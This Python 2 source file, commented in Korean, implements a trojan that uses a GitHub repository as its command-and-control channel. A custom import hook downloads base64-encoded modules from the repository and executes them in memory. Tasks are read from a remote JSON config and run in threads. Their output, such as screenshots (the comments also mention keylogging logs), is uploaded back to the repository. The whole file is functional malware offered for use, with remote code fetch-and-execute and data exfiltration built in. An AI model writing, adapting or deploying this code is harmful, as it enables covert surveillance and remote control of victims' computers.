#-*- coding: utf-8 -*-
import json, base64, sys, time, imp, random, threading, Queue, os
from github3 import login
from datetime import datetime

# My Github Structure
# khw5123(Name) - moonriver(Repository) - master2(Branch) - config - screenshot.json
#                                                         - data - 스크린샷 이미지 파일이 저장될 위치
#                                                         - modules - screenshot.py 

trojan_config="screenshot.json" # moonriver - master2 - config 디렉터리에 있는 json 파일
data_path="data/"# 스크린샷 파일이 저장될 위치
trojan_modules=[]
task_queue=Queue.Queue()
configured=False
GithubAccount="" # 깃허브 로그인 계정
GithubPassword="" # 깃허브 로그인 패스워드
GithubName="khw5123" # 깃허브 이름
GithubRepository="moonriver" # Repository
GithubBranch="master2" # Branch

class GitImporter(object): # 깃허브 저장소로부터 라이브러리를 가져오는 모듈 임포터 클래스
    def __init__(self):
        self.current_module_code="" # moonriver - master2 - modules 디렉터리에 있는 파이썬 파일의 코드가 저장될 변수
    def find_module(self, fullname,path=None): # 모듈 찾는 함수
        if configured:
            #print "[*] Attempting to retrieve %s" % fullname
            new_library=get_file_contents("modules/%s" % fullname) # get_file_contents 함수를 호출해 Base64 로 인코딩된 깃허브 저장소의 파이썬 코드 저장
            if new_library is not None: # 해당 파이썬 파일이 존재할 경우
                self.current_module_code=base64.b64decode(new_library) # current_module_code 변수에 디코딩한 파이썬 코드 저장
                #print self.current_module_code
                return self # 객체 반환
        return None
    def load_module(self, name): # 모듈 로드 함수
        module=imp.new_module(name) # imp 모듈을 이용해 빈 모듈 객체 생성
        exec self.current_module_code in module.__dict__ # 위 find_module 함수에서 current_module_code 변수에 저장한 파이썬 코드를 모듈 객체에 추가
        sys.modules[name]=module # 모듈 객체를 sys.modules 에 추가
        return module # 모듈 객체 반환

def connect_to_github(): # 깃허브에 로그인해 Repository & Branch 객체를 가져와 반환하는 함수
    gh=login(username=GithubAccount, password=GithubPassword) # 깃허브 계정과 패스워드를 통해 로그인
    repo=gh.repository(GithubName, GithubRepository) # 인증 후 Repository 객체 저장
    branch=repo.branch(GithubBranch) # 인증 후 Branch 객체 저장
    return gh,repo,branch # 객체들 반환

def get_file_contents(filepath): # 깃허브 저장소로부터 json & py 파일을 가져와 내용을 반환하는 함수
    gh,repo,branch=connect_to_github()
    tree=branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            #print "[*] Found file %s" % filepath
            blob=repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config(): # 깃허브 저장소로부터 json 파일을 읽어 내용을 반환하는 함수
    global configured
    config_json=get_file_contents(trojan_config) # get_file_contents 함수 호출
    config=json.loads(base64.b64decode(config_json))
    configured=True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    #print config
    return config

def store_module_result(data): # moonriver - master2 - modules 디렉터리에 있는 파이썬 파일의 run 함수의 반환값(스크린샷 이미지파일 바이너리)을 moonriver - master2 - data 디렉터리에 업로드하는 함수
    gh,repo,branch=connect_to_github() # connect_to_github 함수를 호출해 Repository & Branch 객체 저장
    saveFileName=str(datetime.today().year)+"-"+str(datetime.today().month)+"-"+str(datetime.today().day)+"-"+str(datetime.today().hour)+"-"+str(datetime.today().minute)+"-"+str(datetime.today().second)+".png" # moonriver - master2 - data 에 저장될 파일명으로 업로드 시간으로 설정
    remote_path="%s%s" % (data_path, saveFileName) # moonriver - master2 - modules - data/saveFileName run 함수의 반환값 저장 경로 설정
    repo.create_file(remote_path,"Commit message", data) # 깃허브 저장소에 run 함수의 반환값을 위 저장 경로의 파일로 생성(깃허브 업로드 내용(키로깅 내역)을 다른 사람이 알아볼 수 없도록 하려면 data 변수에 인코딩 등의 암호화 처리 하면됨)
    #print data
    return

def module_runner(module): # 깃허브 저장소의 파이썬 파일을 실행하고 반환값을 저장소로 업로드하는 함수
    task_queue.put(1)
    result=sys.modules[module].run() # moonriver - master2 - modules 디렉터리에 있는 파이썬 파일의 run 함수를 호출해 모듈 실행
    task_queue.get()
    store_module_result(result) # get_trojan_config 함수를 호출해 run 함수의 반환값을 깃허브 저장소로 업로드
    #print result
    return

def main():
    sys.meta_path=[GitImporter()] # 모듈 임포터 클래스인 GitImporter 추가
    if task_queue.empty():
        config=get_trojan_config() # get_trojan_config 함수 호출
        for task in config:
            t=threading.Thread(target=module_runner, args=(task['module'],)) # 스레드로 module_runner 함수 호출
            t.start()
        
if __name__=="__main__":
    main()
